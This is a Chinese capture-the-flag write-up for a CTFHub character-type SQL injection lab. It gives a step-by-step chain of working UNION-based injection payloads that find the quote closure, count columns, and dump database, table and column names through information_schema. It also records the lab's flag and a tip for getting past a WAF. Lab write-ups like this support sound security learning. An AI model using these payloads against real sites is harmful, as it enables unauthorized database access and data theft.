---
title: CTFHub-SQL注入-字符式注入 Writeup
date: 2026-09-27
category: web
tags: [CTFHub, SQL注入, 字符式注入]
---
## 解题步骤
 
### 判断闭合方式
• 先在输入框输入 1，点击 Search，页面正常显示。
• 输入 1'，如果报错，说明数据库执行的是单引号闭合的 SQL 语句（如 SELECT * FROM table WHERE id = '1''）。
• 输入 1' #（或 1' -- ，--  后面需加空格），如果页面恢复正常，说明 # 成功注释掉了后面的代码，闭合方式确认为单引号 '。 
### 判断字段数（列数）
使用 ORDER BY 来确定当前查询语句返回的列数：
• 输入 1' ORDER BY 1 # （正常）
• 输入 1' ORDER BY 2 # （正常）
• 输入 1' ORDER BY 3 # （如果报错，说明查询结果只有 2 列）。 
### 确定回显位置（联合查询）
使用 UNION SELECT 查看哪几个字段会显示在页面上：
• 输入 -1' UNION SELECT 1, 2 # （前面的数字用负数或 0，是为了让原查询无结果，从而在页面直接显示联合查询的结果）。
• 观察页面上显示的数字，假设显示的是 2，那么第 2 个字段就是回显位。 
### 获取数据库信息（假设有 2 列，回显位是 2）
• 查库名：
-1' UNION SELECT 1, database() #
• 查表名（将库名替换为你查到的名字）：
-1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema = '库名' #
• 查列名（将表名替换为你查到的名字）：
-1' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name = '表名' #
• 查具体数据（Flag）（将列名和表名替换）：
-1' UNION SELECT 1, group_concat(列名) FROM 表名 # 
### 获取 Flag
找到代表 flag 的字段（通常表名类似 flag、secret，或列名带有 flag），将内容提取出来提交即可。

## Flag
ctfhub{b5cc7a0bbb0d7dd533687b84}

## 注意
释符交替：注入过程中并非一帆风顺，在查库名时曾遇到页面空白。这提醒我们在实战中不能死守一个 Payload，当 # 被 WAF 拦截或解析异常时，要灵活切换为 --+ 或 --
